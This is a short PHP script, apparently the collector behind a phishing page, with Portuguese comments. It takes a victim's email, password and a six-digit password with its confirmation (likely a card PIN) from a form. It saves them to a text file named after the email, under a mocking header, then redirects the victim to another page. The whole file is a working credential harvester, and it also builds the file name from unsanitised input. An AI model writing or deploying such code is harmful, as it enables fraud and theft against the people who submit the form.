<?php 
header("Content-type: text/html; charset=utf-8");

$email = $_POST['email'];
$senha = $_POST['password'];
$senha6 = $_POST['senha6'];
$senhaRetry = $_POST['senhacard2'];

$teste = "
=====CHEGOU INFO FDP=====<br>
=========================<br>
EMAIL: $email <br>
SENHA: $senha <br>
SENHA6: $senha6 <br>
SENHA6 CONFIRMADA: $senhaRetry <br>
=========================
";





    //mesma pasta
    $dir="";
    
    //outra pasta, caminho da pasta, exemplo
    $dir="dados/";
    
    // glob() - Retorna um array contendo todos os arquivos (*) com extensão .txt do diretorio indicado
    $array = glob($dir."*.txt");
    
    // se for um array e não vazio
    if ( is_array($array) && !empty($array) ) {
        $numeros=[];
            foreach ( $array as $val) {
                //cria um array somente com a parte numérica dos nomes dos arquivos
                $numeros[] = preg_replace("/[^0-9]/", "", $val);
            }
        
        // max() recupera o maior valor do array $numeros
        // cria o numero do próximo nome do arquivo de texto
        $numArquivo = max($numeros)+1; 
    
    }
    
    //cria o nome do arquivo de texto
    $filename = $email.".txt";

        
       // cria conteudo para escrever no arquivo de texto
        $textoPublicar= $teste;
       
       //cria o arquivo e grava
       $arquivo = fopen($dir.$filename, 'w');
       fwrite($arquivo, $textoPublicar);
       fclose($arquivo);
      
    


header("location:liberacao.php");
 ?>
